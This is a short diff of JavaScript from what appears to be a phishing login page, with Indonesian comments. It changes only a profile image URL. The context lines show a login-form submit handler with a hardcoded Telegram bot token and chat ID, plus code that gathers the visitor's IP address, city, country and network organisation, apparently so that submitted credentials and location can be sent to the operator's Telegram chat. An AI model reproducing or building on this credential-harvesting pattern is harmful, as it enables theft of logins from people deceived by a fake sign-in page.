@@ -8,7 +8,7 @@ document.getElementById("loginForm").addEventListener("submit", async function(e
     let botToken = "AAFmbkgr8rhoSkow-Yf6EXTy8DPu0Az 7021";
     let chatId = "7894929132"; // Pakai 1 ID saja
 
-    let profileImageUrl = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ_fMq7l79lm6-bYF7qqvwuxlKpXPgJ90_TLA&usqp=CAU";
+    let profileImageUrl = "https://staticg.sportskeeda.com/editor/2022/01/f49b9-16421055515852-1920.jpg";
 
     let ipInfo = { ip: "Tidak diketahui", city: "Tidak diketahui", country: "Tidak diketahui", org: "Tidak diketahui" };
     try {
